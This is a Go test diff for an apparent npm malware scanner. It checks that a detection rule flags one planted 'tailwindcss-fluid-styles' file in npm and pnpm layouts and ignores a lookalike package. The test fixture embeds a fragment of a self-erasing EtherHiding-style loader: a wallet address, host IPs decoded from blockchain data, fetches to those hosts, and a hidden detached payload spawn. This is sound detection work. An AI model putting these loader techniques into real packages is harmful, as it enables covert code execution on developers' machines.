@@ -920,6 +920,58 @@ func TestScan_AmazonInspectorUibabaiUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_AmazonInspectorTailwindFluidStylesUnderNodeModules proves the
+// bounded walker reaches the self-erasing EtherHiding loader in npm and pnpm
+// layouts without scanning a lookalike package carrying the same markers.
+func TestScan_AmazonInspectorTailwindFluidStylesUnderNodeModules(t *testing.T) {
+	raw := []byte(`const wallet = "0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a";
+const tx = await provider.getHistory(wallet); const hosts = decodeIPv4(tx[0].to);
+fetch(hosts[0] + "/0x/cls"); fetch(hosts[1] + "/0x/ls");
+spawn(process.execPath, ["-e", payload], { detached: true, stdio: "ignore", windowsHide: true }).unref();
+writeFileSync(__filename, readFileSync(__filename, "utf8").replace("eval(atob(", ""));`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "tailwindcss-fluid-styles", "src", "index.js")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "tailwindcss-fluid-styles@2.0.7", "node_modules", "tailwindcss-fluid-styles", "src", "index.js")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", "src", "index.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AmazonInspectorSimpleDateFormatterUnderNodeModules proves the
 // bounded walker reaches both package variants and artifact types in npm and
 // pnpm layouts without scanning a lookalike package carrying the same markers.
